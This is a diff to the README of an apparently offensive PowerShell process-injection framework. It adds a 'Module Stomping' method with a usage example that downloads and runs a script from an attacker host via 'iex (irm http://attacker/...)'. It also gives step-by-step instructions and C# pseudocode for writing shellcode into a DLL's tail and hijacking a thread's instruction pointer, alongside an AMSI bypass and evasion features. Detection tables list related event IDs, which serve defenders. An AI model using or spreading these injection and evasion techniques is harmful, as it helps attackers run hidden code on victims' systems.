@@ -12,7 +12,8 @@ A stealthy PowerShell-based process injection framework implementing multiple in
   - APC Injection (Early Bird + `QueueUserAPC`)  
   - Thread Hijacking with crash protection  
   - Process Ghosting  
-  - Classic Remote Thread Injection  
+  - Classic Remote Thread Injection
+  - Module Stomping v2 (end‑of‑image tail write)
 
 - **Evasion Capabilities**  
   - AMSI bypass via function patching  
@@ -38,7 +39,7 @@ graph TD
     D --> E
     E --> F[Evasion Checks]
     F --> G[Injection Method]
-    G --> H[APC/ThreadHijack/Ghosting/RemoteThread]
+    G --> H[APC/ThreadHijack/Ghosting//ModuleStomp/RemoteThread]
     H --> I[Shellcode Execution]
 ```
 ---
@@ -96,6 +97,19 @@ Invoke-PhantomInjector -PayloadUrl http://attacker/sc.bin `
 ```
 
 ![image](https://github.com/user-attachments/assets/ef7831e5-524d-4910-920a-ba17cf5faeea)
+
+### 5. Module Stomping v2 
+
+```
+iex (irm http://attacker/PhantomInjector.ps1)
+Invoke-PhantomInjector `
+  -PayloadPath calc.bin `
+  -InjectionMethod ModuleStomping `
+  -ProcessName notepad `
+  -TimeoutMS 2000
+```
+
+<img width="1937" height="865" alt="image" src="https://github.com/user-attachments/assets/9b20bea6-b544-4789-a3b1-c4836461d89a" />
 
 
 ---
@@ -198,6 +212,8 @@ byte[] CreateSyscallStub(uint syscallId) {
 | `NtCreateThreadEx`  | 0xC0   | Thread Hijacking     |
 | `NtAllocateVirtualMemory` | 0x18   | Process Ghosting     |
 | `NtQueueApcThread` | 0x42   | APC Injection        |
+| `NtGetContextThread` | 0x??   | Module Stomping        |
+| `NtSetContextThread` | 0x??   | Module Stomping        |
 
 **Enhanced Detection Table**
 
@@ -206,7 +222,7 @@ byte[] CreateSyscallStub(uint syscallId) {
 | APC Injection     | High                  | Medium                 |
 | Thread Hijacking  | Medium                | Low                    |
 | Process Ghosting  | High                  | Medium                 |
-
+| Module Stomping   | Medium                | Low                    |
 
 **Pro Tip**
 Combine with -UnhookNTDLL for clean syscall execution environment
@@ -289,6 +305,49 @@ NtCreateSection(out hSection, SEC_ALL_ACCESS, IntPtr.Zero, 0,
                 PAGE_EXEC_READ, SEC_IMAGE, hFile);
 NtCreateProcessEx(out hProcess, PROC_ALL_ACCESS, IntPtr.Zero,
                   GetCurrentProcess(), CREATE_SUSPENDED, hSection, …);
+```
+
+#### 4 Module Stomping Injection (Tail + Hijack Fallback)
+    
+This method:
+
+1. Finds a suitable DLL in the target process and computes a “tail‑of‑image” address (base + SizeOfImage − shellcode.Length).
+
+2. Backs up the original bytes at that region.
+
+3. Changes protection to RWX and writes shellcode.
+
+4. Restores original protection.
+
+5. Suspends one thread, uses NtGetContextThread/NtSetContextThread to set its RIP/EIP to the shellcode address.
+
+6. Resumes the thread to guarantee execution.
+
+7. After timeout, restores the original bytes and protections if the process is still alive.
+
+```mermaid
+flowchart LR
+    A[Find suitable DLL & compute tail-of-image address] --> B[Backup original bytes]
+    B --> C[Change protection to RWX & write shellcode]
+    C --> D[Restore original protection]
+    D --> E[Suspend a thread & NtGetContextThread/NtSetContextThread to set RIP/EIP]
+    E --> F[Resume thread for execution]
+    F --> G[After timeout, restore original bytes & protections]
+```
+
+```csharp
+// Pseudocode snippet for the thread‑hijack fallback
+IntPtr target = baseAddr + (SizeOfImage - shellcode.Length);
+Backup(original);
+Protect(target, PAGE_EXECUTE_READWRITE);
+WriteMemory(target, shellcode);
+RestoreProtect(target, originalProt);
+
+// Hijack context:
+NtGetContextThread(hThread, &ctx);
+ctx.Rip = (ulong)target;
+NtSetContextThread(hThread, &ctx);
+ResumeThread(hThread);
 ```
 
 ---
@@ -386,6 +445,7 @@ NtCreateProcessEx(out hProcess, PROC_ALL_ACCESS, IntPtr.Zero,
 |-------------------|------------------------------------------------|-----------------|
 | APC Injection     | `QueueUserAPC` from non-image memory           | 10              |
 | Thread Hijacking  | `SetThreadContext` RIP modification            | 8               |
+| Module Stomping   |Tail-of-image write + context hijack            | 12              |
 | Process Ghosting  | Section creation from deleted files            | 12              |
 | Syscall Usage     | NTDLL unhooking + unusual call traces          | 7, 11           |
 
